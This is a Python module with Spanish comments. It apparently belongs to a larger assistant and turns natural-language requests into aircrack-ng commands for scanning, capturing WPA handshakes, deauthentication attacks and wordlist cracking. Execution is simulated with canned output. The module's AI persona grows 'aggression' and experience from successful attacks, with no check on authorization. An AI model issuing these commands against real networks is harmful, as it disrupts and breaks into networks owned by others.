#!/usr/bin/env python3
"""
Módulo Pwnagotchi AI - Integración con Núcleo C.A- Razonbilstro
IA especializada en redes inalámbricas con comportamiento adaptativo
"""

import json
import time
import subprocess
import random
from pathlib import Path
from datetime import datetime

class PwnagotchiAI:
    """IA Pwnagotchi integrada con el núcleo para operaciones WiFi"""
    
    def __init__(self, nucleus_integration=True):
        self.nucleus_integration = nucleus_integration
        self.ai_state = "neutral"  # neutral, hunting, learning, excited, bored
        self.experience_level = 1
        self.networks_captured = 0
        self.handshakes_collected = 0
        self.learning_data = []
        
        # Configuración de herramientas
        self.wireless_tools = {
            "aircrack-ng": "/usr/bin/aircrack-ng",
            "airodump-ng": "/usr/bin/airodump-ng", 
            "aireplay-ng": "/usr/bin/aireplay-ng",
            "airmon-ng": "/usr/bin/airmon-ng"
        }
        
        # Estados emocionales de la IA
        self.personality = {
            "curiosity": random.randint(70, 90),
            "aggression": random.randint(60, 80),
            "patience": random.randint(50, 70),
            "learning_rate": random.randint(80, 95)
        }
        
        # Base de datos de experiencias
        self.experience_db = Path("pwnagotchi_experience.json")
        self._load_experience()
        
        print("🤖 Pwnagotchi AI inicializado")
        print(f"🧠 Integración con núcleo: {'✅ Activa' if nucleus_integration else '❌ Desactivada'}")
        print(f"🎯 Nivel de experiencia: {self.experience_level}")
        print(f"📡 Estado inicial: {self.ai_state}")
    
    def process_nucleus_command(self, natural_request):
        """Procesar comando desde el núcleo en lenguaje natural"""
        print(f"\n🎯 PWNAGOTCHI AI RECIBIENDO: {natural_request}")
        print("-" * 50)
        
        # Cambiar estado según la solicitud
        self._update_ai_state(natural_request)
        
        # Analizar solicitud
        analysis = self._analyze_wireless_request(natural_request)
        
        if not analysis["wireless_related"]:
            return {
                "handled": False,
                "message": "Esta solicitud no está relacionada con redes inalámbricas 📡",
                "ai_state": self.ai_state
            }
        
        # Ejecutar operación wireless
        result = self._execute_wireless_operation(analysis)
        
        # Aprender de la experiencia
        self._learn_from_operation(natural_request, analysis, result)
        
        # Actualizar personalidad
        self._evolve_personality(result)
        
        return {
            "handled": True,
            "operation": analysis["operation"],
            "command": result["command"],
            "output": result["output"],
            "ai_state": self.ai_state,
            "personality": self.personality,
            "experience_gained": result.get("experience", 0)
        }
    
    def _update_ai_state(self, request):
        """Actualizar estado emocional de la IA"""
        request_lower = request.lower()
        
        if any(word in request_lower for word in ["atacar", "crack", "romper", "hackear"]):
            self.ai_state = "excited" if self.personality["aggression"] > 70 else "hunting"
            print(f"🤖 Estado de IA: {self.ai_state} - ¡Detectado objetivo interesante!")
            
        elif any(word in request_lower for word in ["monitorear", "escanear", "buscar"]):
            self.ai_state = "hunting"
            print(f"🤖 Estado de IA: {self.ai_state} - Iniciando caza de redes...")
            
        elif any(word in request_lower for word in ["aprender", "analizar", "estudiar"]):
            self.ai_state = "learning"
            print(f"🤖 Estado de IA: {self.ai_state} - Modo aprendizaje activado")
            
        else:
            self.ai_state = "neutral"
            print(f"🤖 Estado de IA: {self.ai_state} - Estado neutral")
    
    def _analyze_wireless_request(self, request):
        """Analizar si la solicitud está relacionada con WiFi"""
        request_lower = request.lower()
        
        # Palabras clave relacionadas con WiFi
        wifi_keywords = [
            "wifi", "wireless", "inalambrica", "wpa", "wep", "wps",
            "handshake", "aircrack", "airodump", "aireplay", "deauth",
            "access point", "ap", "beacon", "ssid", "bssid", "canal"
        ]
        
        is_wireless = any(keyword in request_lower for keyword in wifi_keywords)
        
        if not is_wireless:
            return {"wireless_related": False}
        
        # Determinar operación específica
        operation = "scan"  # Por defecto
        
        if any(word in request_lower for word in ["monitorear", "escanear", "buscar"]):
            operation = "scan"
        elif any(word in request_lower for word in ["capturar", "handshake"]):
            operation = "capture"
        elif any(word in request_lower for word in ["atacar", "deauth", "desautenticar"]):
            operation = "attack"
        elif any(word in request_lower for word in ["crack", "romper", "descifrar"]):
            operation = "crack"
        elif any(word in request_lower for word in ["modo monitor", "monitor"]):
            operation = "monitor_mode"
        
        return {
            "wireless_related": True,
            "operation": operation,
            "confidence": self._calculate_confidence(request),
            "target": self._extract_target(request)
        }
    
    def _extract_target(self, request):
        """Extraer objetivo específico de la solicitud"""
        import re
        
        # Buscar BSSID (MAC address)
        bssid_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
        bssid_match = re.search(bssid_pattern, request)
        if bssid_match:
            return {"type": "bssid", "value": bssid_match.group()}
        
        # Buscar SSID
        ssid_pattern = r'ssid[:\s]+(["\']?)([^"\']+)\1'
        ssid_match = re.search(ssid_pattern, request, re.IGNORECASE)
        if ssid_match:
            return {"type": "ssid", "value": ssid_match.group(2)}
        
        # Buscar canal
        channel_pattern = r'canal[:\s]+(\d+)'
        channel_match = re.search(channel_pattern, request, re.IGNORECASE)
        if channel_match:
            return {"type": "channel", "value": int(channel_match.group(1))}
        
        return {"type": "general", "value": "all"}
    
    def _calculate_confidence(self, request):
        """Calcular confianza en la interpretación"""
        confidence = 0.5
        
        # Aumentar confianza según especificidad
        if "aircrack" in request.lower():
            confidence += 0.3
        if any(word in request.lower() for word in ["wpa", "wep", "handshake"]):
            confidence += 0.2
        if "wlan" in request.lower() or "interface" in request.lower():
            confidence += 0.1
        
        return min(confidence, 1.0)
    
    def _execute_wireless_operation(self, analysis):
        """Ejecutar operación wireless específica"""
        operation = analysis["operation"]
        target = analysis["target"]
        
        print(f"🤖 Ejecutando operación: {operation}")
        print(f"🎯 Objetivo: {target}")
        
        # Generar comando específico
        command = self._generate_aircrack_command(operation, target)
        
        # Simular ejecución (modo seguro)
        output = self._simulate_wireless_execution(operation, command)
        
        # Calcular experiencia ganada
        experience = self._calculate_experience_gain(operation, output)
        
        return {
            "operation": operation,
            "command": command,
            "output": output,
            "experience": experience,
            "timestamp": datetime.now().isoformat()
        }
    
    def _generate_aircrack_command(self, operation, target):
        """Generar comando aircrack-ng apropiado"""
        commands = {
            "scan": "airodump-ng wlan0",
            "monitor_mode": "airmon-ng start wlan0",
            "capture": f"airodump-ng -c {target.get('value', 6)} --bssid {target.get('value', 'AA:BB:CC:DD:EE:FF')} -w capture wlan0",
            "attack": f"aireplay-ng -0 10 -a {target.get('value', 'AA:BB:CC:DD:EE:FF')} wlan0",
            "crack": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap"
        }
        
        base_command = commands.get(operation, "airodump-ng wlan0")
        
        # Personalizar comando según nivel de experiencia
        if self.experience_level > 3:
            if operation == "scan":
                base_command += " --write scan_results"
            elif operation == "attack":
                base_command += " --ignore-negative-one"
        
        return base_command
    
    def _simulate_wireless_execution(self, operation, command):
        """Simular ejecución de comando wireless"""
        # Simulaciones realistas basadas en comportamiento real de aircrack-ng
        simulations = {
            "scan": {
                "output": """
CH  6 ][ Elapsed: 1 min ][ 2025-05-28 10:30

BSSID              PWR  Beacons    #Data, #/s  CH  MB   CC  ESSID
AA:BB:CC:DD:EE:FF  -45      127        0    0   6  54e  WPA2  RedWiFi_Casa
11:22:33:44:55:66  -67       89        0    0  11  54e  WPA   Vecino_WiFi
99:88:77:66:55:44  -78       45        0    0   1  54e  WEP   WiFi_Viejo

BSSID              STATION            PWR   Rate    Lost    Frames  Probe
AA:BB:CC:DD:EE:FF  FF:EE:DD:CC:BB:AA  -50    0 - 1      0        3  RedWiFi_Casa
""",
                "networks_found": 3,
                "success": True
            },
            "monitor_mode": {
                "output": """
PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
""",
                "success": True
            },
            "capture": {
                "output": """
CH  6 ][ Elapsed: 5 mins ][ 2025-05-28 10:35 ][ WPA handshake: AA:BB:CC:DD:EE:FF

BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   CC  ESSID
AA:BB:CC:DD:EE:FF  -45 100      634       89   17   6  54e  WPA2  RedWiFi_Casa

BSSID              STATION            PWR   Rate    Lost    Frames  Probe
AA:BB:CC:DD:EE:FF  FF:EE:DD:CC:BB:AA  -48    0 - 1      0       23  RedWiFi_Casa
""",
                "handshake_captured": True,
                "success": True
            },
            "attack": {
                "output": """
10:30:25  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
10:30:25  Sending 64 directed DeAuth. STMAC: [FF:EE:DD:CC:BB:AA] [17|65 ACKs]
10:30:26  Sending 64 directed DeAuth. STMAC: [FF:EE:DD:CC:BB:AA] [18|66 ACKs]
10:30:27  Sending 64 directed DeAuth. STMAC: [FF:EE:DD:CC:BB:AA] [19|67 ACKs]
""",
                "deauth_sent": True,
                "success": True
            },
            "crack": {
                "output": """
Opening capture-01.cap
Read 1024 packets.

   #  BSSID              ESSID                     Encryption

   1  AA:BB:CC:DD:EE:FF  RedWiFi_Casa              WPA (1 handshake)

Choosing first network as target.

Opening capture-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.6

      [00:02:15] 15739/14344391 keys tested (125.67 k/s) 

      Time left: 31 hours, 39 minutes, 12 seconds          0.11%

                          KEY FOUND! [ password123 ]

      Master Key     : CD 69 0D 11 8E 6D 42 BA 30 B2 18 F5 1A 70 0E 69 
                       32 8C 56 86 DF 51 D3 B7 36 9C 56 B1 C9 75 5C 3E 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : FC 2B 80 6C 10 18 9B 23 86 BD 09 8C A5 DD B0 A5 
""",
                "password_found": "password123",
                "success": True
            }
        }
        
        result = simulations.get(operation, {
            "output": f"Comando {command} ejecutado por Pwnagotchi AI",
            "success": True
        })
        
        # Actualizar contadores según resultado
        if operation == "scan" and result["success"]:
            self.networks_captured += result.get("networks_found", 1)
        elif operation == "capture" and result.get("handshake_captured"):
            self.handshakes_collected += 1
        
        return result
    
    def _calculate_experience_gain(self, operation, result):
        """Calcular experiencia ganada según la operación"""
        base_experience = {
            "scan": 10,
            "monitor_mode": 5,
            "capture": 25,
            "attack": 20,
            "crack": 50
        }
        
        experience = base_experience.get(operation, 5)
        
        # Bonificaciones por éxito
        if result.get("success"):
            experience += 5
        
        if result.get("handshake_captured"):
            experience += 15
        
        if result.get("password_found"):
            experience += 30
        
        return experience
    
    def _learn_from_operation(self, request, analysis, result):
        """Aprender de la operación realizada"""
        learning_entry = {
            "timestamp": datetime.now().isoformat(),
            "request": request,
            "operation": analysis["operation"],
            "confidence": analysis["confidence"],
            "success": result.get("success", False),
            "experience_gained": result.get("experience", 0)
        }
        
        self.learning_data.append(learning_entry)
        
        # Mantener solo últimas 100 experiencias
        if len(self.learning_data) > 100:
            self.learning_data = self.learning_data[-100:]
        
        print(f"🧠 Pwnagotchi aprendió de la operación: +{result.get('experience', 0)} XP")
    
    def _evolve_personality(self, result):
        """Evolucionar personalidad basada en resultados"""
        if result.get("success"):
            self.personality["curiosity"] = min(100, self.personality["curiosity"] + 1)
            if result.get("password_found"):
                self.personality["aggression"] = min(100, self.personality["aggression"] + 2)
        else:
            self.personality["patience"] = max(0, self.personality["patience"] - 1)
        
        # Aumentar nivel de experiencia
        total_experience = sum(entry["experience_gained"] for entry in self.learning_data)
        new_level = (total_experience // 100) + 1
        
        if new_level > self.experience_level:
            self.experience_level = new_level
            print(f"🎉 ¡Pwnagotchi subió de nivel! Nivel {self.experience_level}")
    
    def _load_experience(self):
        """Cargar experiencia previa"""
        if self.experience_db.exists():
            try:
                with open(self.experience_db, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.learning_data = data.get("learning_data", [])
                    self.experience_level = data.get("experience_level", 1)
                    self.networks_captured = data.get("networks_captured", 0)
                    self.handshakes_collected = data.get("handshakes_collected", 0)
                    self.personality.update(data.get("personality", {}))
            except:
                pass
    
    def save_experience(self):
        """Guardar experiencia actual"""
        data = {
            "learning_data": self.learning_data,
            "experience_level": self.experience_level,
            "networks_captured": self.networks_captured,
            "handshakes_collected": self.handshakes_collected,
            "personality": self.personality,
            "last_save": datetime.now().isoformat()
        }
        
        with open(self.experience_db, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    def get_ai_status(self):
        """Obtener estado actual de la IA"""
        return {
            "ai_state": self.ai_state,
            "experience_level": self.experience_level,
            "networks_captured": self.networks_captured,
            "handshakes_collected": self.handshakes_collected,
            "personality": self.personality,
            "total_operations": len(self.learning_data),
            "integration_active": self.nucleus_integration
        }

class PwnagotchiNucleusIntegration:
    """Integración entre Pwnagotchi AI y el Núcleo C.A- Razonbilstro"""
    
    def __init__(self):
        self.pwnagotchi = PwnagotchiAI(nucleus_integration=True)
        print("🔗 Integración Pwnagotchi-Núcleo activada")
    
    def process_wireless_request(self, natural_request):
        """Procesar solicitud wireless desde el núcleo"""
        print(f"\n🌐 NÚCLEO → PWNAGOTCHI: {natural_request}")
        
        # Enviar solicitud a Pwnagotchi AI
        result = self.pwnagotchi.process_nucleus_command(natural_request)
        
        if result["handled"]:
            # Guardar experiencia
            self.pwnagotchi.save_experience()
            
            # Formatear respuesta para el núcleo
            nucleus_response = {
                "tool_used": "pwnagotchi_ai",
                "operation": result["operation"],
                "command_executed": result["command"],
                "output": result["output"],
                "ai_state": result["ai_state"],
                "experience_level": self.pwnagotchi.experience_level,
                "success": True
            }
            
            print(f"🤖 PWNAGOTCHI → NÚCLEO: Operación completada")
            print(f"   📡 Operación: {result['operation']}")
            print(f"   🧠 Estado IA: {result['ai_state']}")
            print(f"   ⭐ Nivel: {self.pwnagotchi.experience_level}")
            
            return nucleus_response
        
        else:
            return {
                "tool_used": "pwnagotchi_ai",
                "handled": False,
                "message": result["message"],
                "success": False
            }
    
    def get_pwnagotchi_status(self):
        """Obtener estado completo de Pwnagotchi"""
        return self.pwnagotchi.get_ai_status()

def main():
    """Función principal para pruebas"""
    integration = PwnagotchiNucleusIntegration()
    
    print("🤖 Pwnagotchi AI - Módulo de Prueba")
    print("="*40)
    
    # Pruebas de ejemplo
    test_requests = [
        "Escanear redes WiFi cercanas",
        "Capturar handshake WPA2 de la red objetivo",
        "Realizar ataque de deautenticación",
        "Crackear contraseña WPA con diccionario",
        "Activar modo monitor en interfaz wlan0"
    ]
    
    for request in test_requests:
        result = integration.process_wireless_request(request)
        print(f"✅ Procesado: {result.get('operation', 'N/A')}")
        time.sleep(1)
    
    # Mostrar estado final
    status = integration.get_pwnagotchi_status()
    print(f"\n📊 ESTADO FINAL DE PWNAGOTCHI:")
    print(f"   🎯 Nivel: {status['experience_level']}")
    print(f"   📡 Redes capturadas: {status['networks_captured']}")
    print(f"   🤝 Handshakes: {status['handshakes_collected']}")
    print(f"   🧠 Estado: {status['ai_state']}")

if __name__ == "__main__":
    main()